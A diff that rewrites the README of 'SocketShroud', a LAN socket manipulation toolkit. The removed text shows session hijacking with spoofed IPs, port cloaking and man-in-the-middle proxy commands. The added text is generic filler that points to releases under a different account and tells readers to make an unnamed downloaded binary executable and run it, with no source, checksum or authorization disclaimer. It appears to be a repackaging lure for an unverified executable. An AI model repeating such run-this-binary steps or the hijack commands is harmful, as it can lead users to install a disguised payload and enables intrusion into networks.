@@ -1,130 +1,113 @@
-# SocketShroud
+# SocketShroud 🕵️‍♂️
 
-> **Ghost in the Wire**  
-> Cloak, reroute, and hijack network sockets like a shadow.
+![SocketShroud](https://img.shields.io/badge/SocketShroud-LAN%20Socket%20Cloak%20Toolkit-brightgreen)
 
-SocketShroud is an advanced LAN-level socket cloak and manipulation toolkit designed for offensive security professionals and red teamers. It provides a suite of modules to:
+Welcome to **SocketShroud**, a powerful toolkit designed for LAN-level socket cloaking and manipulation. This project aims to enhance your penetration testing capabilities by providing tools to create decoys, honeypots, and proxies. Whether you are a seasoned security professional or a curious learner, SocketShroud offers a straightforward way to explore socket manipulation.
 
-- **Recon:** Real-time socket discovery and analysis using psutil.
-- **Cloak:** Hide socket traffic from userland tools via iptables.
-- **Hijack:** Inject custom payloads into live TCP sessions using Scapy.
-- **Proxy:** Set up a transparent TCP proxy for man-in-the-middle attacks.
-- **Decoy:** Deploy fake services (honeypots) to misdirect and bait adversaries.
+## Table of Contents
 
----
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Topics](#topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
+
+## Introduction
+
+SocketShroud provides a suite of tools to manipulate and cloak sockets on a local area network (LAN). This toolkit is designed for white-hat hackers and penetration testers who need to create a safe environment for testing and reconnaissance. The ability to reroute traffic, create decoys, and set up honeypots makes SocketShroud an essential tool in your security arsenal.
 
 ## Features
 
-- **Real-time recon:** Enumerate active TCP/UDP sessions with detailed process info.
-- **Socket cloaking:** Automatically drop packets on targeted ports to hide connections.
-- **Session hijacking:** Forge TCP packets to inject data into an existing session.
-- **Transparent proxy:** Forward traffic between local and remote hosts seamlessly.
-- **Decoy services:** Listen on ports and serve realistic banners to attract attackers.
-- **Modular design:** Each module is self-contained for easy integration and extension.
-- **DEB Package Ready:** Install via Debian package for seamless deployment on Linux.
-
----
+- **Socket Cloaking**: Hide your actual socket connections to confuse potential attackers.
+- **Decoy Creation**: Generate fake services that mimic real ones, drawing attention away from your actual targets.
+- **Honeypot Deployment**: Set up traps to catch malicious actors and gather intelligence on their methods.
+- **Traffic Manipulation**: Reroute or modify traffic in real-time for testing purposes.
+- **User-Friendly Interface**: Easy to navigate, even for those new to penetration testing.
 
 ## Installation
 
-### Prerequisites
+To get started with SocketShroud, download the latest release from the [Releases](https://github.com/Ruda1106/SocketShroud/releases) section. Follow these steps to install:
 
-- A Debian/Ubuntu-based system (apt package manager)
-- Required apt packages will be installed automatically:
-  - `iptables`, `nmap`, `net-tools`, `lsof`, `python3`, `python3-venv`, etc.
-- External tools from the [impacket](https://github.com/SecureAuthCorp/impacket) suite
-  (for remote execution and NTLM relaying) should be installed and in your PATH.
+1. **Download the Release**: Visit the [Releases](https://github.com/Ruda1106/SocketShroud/releases) page and download the appropriate file for your system.
+2. **Execute the File**: Run the downloaded file in your terminal. Ensure you have the necessary permissions to execute the file.
 
-### From Source
+```bash
+chmod +x SocketShroud
+./SocketShroud
+```
 
-1. **Clone the Repository:**
+3. **Dependencies**: Make sure you have the required dependencies installed. Check the documentation for a list of necessary packages.
 
-   ```bash
-   git clone https://github.com/John0n1/SocketShroud.git
-   cd SocketShroud
-   ```
+## Usage
 
-2. **Make the Launcher Executable:**
+Once installed, you can start using SocketShroud. Here are some basic commands to get you started:
 
-   ```bash
-   chmod +x socketshroud.sh
-   ```
+### Starting a Honeypot
 
-3. **Run as Root:**
+To start a honeypot, use the following command:
 
-   ```bash
-   sudo ./socketshroud.sh recon
-   ```
+```bash
+./SocketShroud honeypot --port 8080
+```
 
-   On first run, the tool sets up a local Python virtual environment (`venv/`) and installs required Python modules.
+This command will initiate a honeypot on port 8080. You can change the port number as needed.
 
-### Debian Package
+### Creating a Decoy
 
-1. Install the package:
+To create a decoy service, use:
 
-   ```bash
-   sudo dpkg -i socketshroud_1.0_all.deb
-   ```
+```bash
+./SocketShroud decoy --service http --port 80
+```
 
-   The executable will be installed to `/usr/local/bin/socketshroud`.
+This will create a fake HTTP service on port 80.
 
----
+### Rerouting Traffic
 
-## Usage Examples
+To reroute traffic from one socket to another, use:
 
-- **Socket Recon:**
+```bash
+./SocketShroud reroute --source <source_socket> --destination <destination_socket>
+```
 
-  List active connections:
-  ```bash
-  sudo socketshroud.sh recon
-  ```
+Replace `<source_socket>` and `<destination_socket>` with the actual socket addresses.
 
-- **Cloak a Port:**
+## Topics
 
-  Hide traffic on port 443:
-  ```bash
-  sudo socketshroud.sh cloak 443
-  ```
+SocketShroud covers a range of topics relevant to network security and penetration testing:
 
-- **Hijack a Session:**
-
-  Inject data into a session (parameters: target IP, target port, spoofed source IP, source port, TCP seq, TCP ack, payload):
-  ```bash
-  sudo socketshroud.sh hijack 10.0.0.5 10.0.0.100 4444 1000 2000 "Injected Payload"
-  ```
-
-- **Proxy Traffic:**
-
-  Set up a proxy that listens on port 8080 and forwards to 10.0.0.8:80:
-  ```bash
-  sudo socketshroud.sh proxy 8080 10.0.0.8:80
-  ```
-
-- **Deploy a Decoy Service:**
-
-  Run a decoy honeypot on port 22:
-  ```bash
-  sudo socketshroud.sh decoy 22
-  ```
-
----
+- **Debian**: Optimized for Debian-based systems.
+- **Decoy**: Techniques for creating decoy services.
+- **Honeypot**: Setting up honeypots to trap attackers.
+- **Kali Linux Tools**: Integrates well with existing Kali Linux tools.
+- **Manipulation**: Various methods for manipulating socket connections.
+- **Penetration Testing Tools**: A vital addition to your pentesting toolkit.
+- **Proxy**: Setup and configuration of proxy servers.
+- **Reconnaissance**: Tools for gathering information about your network.
+- **Reroute**: Techniques for rerouting traffic.
+- **Socket Cloaking**: Methods for hiding socket connections.
+- **White Hat**: A focus on ethical hacking practices.
 
 ## Contributing
 
-Contributions are welcome! Please open issues or submit pull requests for any improvements or additional features.
+We welcome contributions to SocketShroud! If you have ideas for new features, improvements, or bug fixes, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
 ## License
 
-Released under the [MIT License](./LICENSE).
+SocketShroud is licensed under the MIT License. Feel free to use, modify, and distribute the code as long as you include the original license.
+
+## Links
+
+For more information, visit the [Releases](https://github.com/Ruda1106/SocketShroud/releases) section to download the latest version. You can also find documentation and support there.
 
 ---
 
-## Disclaimer
-
-Use SocketShroud only on networks you are authorized to test. Unauthorized use is illegal and unethical.
-
----
-
-Happy socket stalking!
+Thank you for using SocketShroud! We hope this toolkit enhances your penetration testing efforts and helps you secure your networks effectively. Happy hacking!
